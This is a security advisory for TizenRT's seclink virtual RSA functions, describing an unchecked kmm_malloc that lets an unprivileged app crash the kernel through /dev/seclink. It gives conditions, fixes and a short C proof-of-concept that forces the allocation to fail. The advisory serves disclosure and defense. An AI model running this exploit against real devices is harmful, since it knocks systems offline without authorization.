## SEC-ADV-tizenrt-seclink-virtual-rsa-oom-kernel-dos

### Summary
`virtual_hal_rsa_encrypt` and `virtual_hal_rsa_decrypt` allocate output buffers based on caller-controlled lengths and then `memcpy` without checking allocation success. In protected builds where `/dev/seclink` accepts untrusted ioctl parameters, an unprivileged app can trigger a kernel NULL dereference by forcing `kmm_malloc` to fail.

### Affected Component
`TizenRT/os/se/virtual/hal_virtual.c:438` (`virtual_hal_rsa_encrypt`) and `TizenRT/os/se/virtual/hal_virtual.c:449` (`virtual_hal_rsa_decrypt`), reachable through `TizenRT/os/drivers/seclink/seclink_drv_crypto.c:60` and `TizenRT/os/drivers/seclink/seclink_drv.c:124`.

### Impact
Local denial of service (kernel crash) in protected builds. (CVSS v3.1 7.8 AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Conditions for Vulnerability
- `CONFIG_BUILD_PROTECTED=y` (user/kernel separation enabled).
- `CONFIG_SE_VIRTUAL=y` with seclink enabled (`CONFIG_SECURITY_LINK_DRV=y`, `CONFIG_SECURITY_LINK=y`).
- `/dev/seclink` registered with mode `0666` (`TizenRT/os/drivers/seclink/seclink_drv.c:199`).
- Unprivileged user task can call `sl_rsa_encrypt` / `sl_rsa_decrypt` or invoke `ioctl` on `/dev/seclink`.

### Attack Scenario
An unprivileged app calls `sl_rsa_encrypt` with a very large `dec_data->data_len` so that `kmm_malloc(dec_data->data_len)` fails. The kernel then executes `memcpy(enc_data->data, ...)` with a NULL destination, causing a kernel fault.

### Affected Versions
TizenRT repository snapshot in this workspace. Confirmed in protected build configs such as `TizenRT/build/configs/imxrt1020-evk/loadable_elf_apps/defconfig` (enables `CONFIG_BUILD_PROTECTED`, `CONFIG_SE_VIRTUAL`, and seclink).

### Mitigations
- Check `kmm_malloc` return values before `memcpy` and return an error on allocation failure.
- Validate caller-provided lengths and cap them to reasonable maximums.
- Restrict `/dev/seclink` permissions to privileged tasks only.

### Proof of Concept (user app)

```c
#include <tinyara/seclink.h>
#include <tinyara/security_hal.h>

int main(void) {
    sl_ctx hnd;
    hal_rsa_mode mode = {0};
    hal_data in = {0};
    hal_data out = {0};

    if (sl_init(&hnd) != SECLINK_OK) {
        return -1;
    }

    in.data_len = 0x7fffffff; /* force allocation failure */
    in.data = (void *)0x1000; /* any non-NULL pointer */

    /* Triggers virtual_hal_rsa_encrypt -> kmm_malloc -> memcpy(NULL, ...) */
    sl_rsa_encrypt(hnd, &in, &mode, 0, &out);

    return 0;
}
```

### Credits
Identified by SecMate automated analysis and validated during manual triage.
